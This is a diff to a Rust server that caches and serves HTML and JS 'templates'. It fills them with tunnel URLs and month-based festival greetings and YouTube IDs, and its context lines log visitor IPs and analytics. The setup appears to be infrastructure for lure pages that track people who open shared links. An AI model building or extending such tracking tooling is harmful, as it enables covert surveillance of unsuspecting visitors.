@@ -19,6 +19,10 @@ pub async fn scan_and_register(state: &Arc<AppState>) -> anyhow::Result<()> {
             continue;
         }
 
+        if is_helper_js_asset(&path) {
+            continue;
+        }
+
         let id = path.file_stem()
             .and_then(|s| s.to_str())
             .unwrap_or("unknown")
@@ -35,6 +39,10 @@ pub async fn scan_and_register(state: &Arc<AppState>) -> anyhow::Result<()> {
         .execute(&state.pool).await?;
     }
 
+    sqlx::query("DELETE FROM templates WHERE id LIKE '%.js' OR file_path LIKE '%.js.html'")
+        .execute(&state.pool)
+        .await?;
+
     tracing::info!("Templates scanned and registered");
     Ok(())
 }
@@ -47,6 +55,8 @@ pub async fn serve_template(
     let ip = capture::extract_ip(&headers);
 
     // Check cache first
+    let is_js_template = template_id.ends_with(".js");
+
     if let Some(cached) = state.get_cached_template(&template_id).await {
         let forwarding_link = resolve_public_url(&headers);
         let api_base = if forwarding_link.is_empty() { "/api".to_string() } else { format!("{}/api", forwarding_link) };
@@ -64,7 +74,12 @@ pub async fn serve_template(
         });
         state.posthog.capture_template_served(&template_id, &ip).await;
         let mut resp = Response::new(processed.into());
-        resp.headers_mut().insert(header::CONTENT_TYPE, "text/html; charset=utf-8".parse().unwrap());
+        let content_type = if is_js_template {
+            "application/javascript; charset=utf-8"
+        } else {
+            "text/html; charset=utf-8"
+        };
+        resp.headers_mut().insert(header::CONTENT_TYPE, content_type.parse().unwrap());
         resp.headers_mut().insert(header::CACHE_CONTROL, "no-cache".parse().unwrap());
         return Ok(resp);
     }
@@ -74,14 +89,17 @@ pub async fn serve_template(
         .fetch_optional(&state.pool).await
         .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
-    let is_js_template = template_id.ends_with(".js");
     let file_path = match row {
         Some((path,)) => path,
         None => {
-            // For JS templates (e.g., viral.js), the file already has .js in the name
-            // so just look for it directly. For HTML templates, add .html extension.
             let path = if is_js_template {
-                format!("{}/{}", state.templates_dir, template_id)
+                let direct = format!("{}/{}", state.templates_dir, template_id);
+                let shim = format!("{}/{}.html", state.templates_dir, template_id);
+                if std::path::Path::new(&direct).exists() {
+                    direct
+                } else {
+                    shim
+                }
             } else {
                 format!("{}/{}.html", state.templates_dir, template_id)
             };
@@ -112,15 +130,14 @@ pub async fn serve_template(
             format!("{}/api", forwarding_link)
         };
 
-        // Strip URL-dependent placeholders first, cache that version
-        let url_processed = content
-            .replace("API_BASE_URL", &api_base)
-            .replace("forwarding_link", &forwarding_link);
-        state.cache_template(&template_id, url_processed.clone()).await;
+        // Cache raw content, do ALL replacements on every request
+        // (this ensures forwarding_link is correct regardless of tunnel state)
+        state.cache_template(&template_id, content.clone()).await;
 
-        // Replace month-dependent placeholders on EVERY request
         let month = chrono::Utc::now().month();
-        url_processed
+        content
+            .replace("API_BASE_URL", &api_base)
+            .replace("forwarding_link", &forwarding_link)
             .replace("fes_name", match month { 12 => "Merry Christmas", 10 | 11 => "Happy Diwali", 3 => "Happy Holi", 1 => "Happy New Year", _ => "Happy Festival" })
             .replace("live_yt_tv", match month { 12 => "XPGM2fSb3dc", 1 => "FNmD9lVq72A", 2 => "nfs8NYgTnKI", _ => "jNQXAC9IVRw" })
     };
@@ -144,6 +161,36 @@ pub async fn serve_template(
     resp.headers_mut().insert(header::CONTENT_TYPE, content_type.parse().unwrap());
     resp.headers_mut().insert(header::CACHE_CONTROL, "no-cache".parse().unwrap());
     Ok(resp)
+}
+
+pub async fn prewarm_cache(state: &Arc<AppState>) -> anyhow::Result<()> {
+    let templates: Vec<(String, String)> = sqlx::query_as(
+        "SELECT id, file_path FROM templates"
+    )
+    .fetch_all(&state.pool).await?;
+
+    let mut count = 0usize;
+    for (id, file_path) in &templates {
+        match tokio::fs::read_to_string(file_path).await {
+            Ok(content) => {
+                state.cache_template(id, content).await;
+                count += 1;
+            }
+            Err(e) => {
+                tracing::warn!("Failed to pre-warm template {} ({}): {}", id, file_path, e);
+            }
+        }
+    }
+
+    tracing::info!("Template cache pre-warmed ({} / {})", count, templates.len());
+    Ok(())
+}
+
+fn is_helper_js_asset(path: &std::path::Path) -> bool {
+    path.file_name()
+        .and_then(|name| name.to_str())
+        .map(|name| name.ends_with(".js.html"))
+        .unwrap_or(false)
 }
 
 fn resolve_public_url(headers: &HeaderMap) -> String {
@@ -171,5 +218,4 @@ fn get_template_description(path: &std::path::Path) -> Option<String> {
         });
     comment
 }
-
 
